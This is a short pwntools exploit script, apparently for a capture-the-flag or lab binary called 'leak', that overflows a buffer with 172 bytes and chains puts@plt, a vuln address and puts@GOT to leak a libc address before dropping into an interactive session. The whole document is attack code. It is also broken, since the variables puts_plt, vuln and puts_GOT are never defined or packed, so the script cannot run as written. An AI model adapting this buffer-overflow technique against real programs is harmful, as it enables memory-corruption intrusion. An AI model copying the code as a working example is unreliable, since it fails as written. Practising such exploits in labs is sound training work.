from pwn import *
context(arch='i386', os='linux')

r = process("./leak", shell=True)
r.sendline("a"*172 + puts_plt + vuln  + puts_GOT )
a=r.recv(5)
r.interactive()
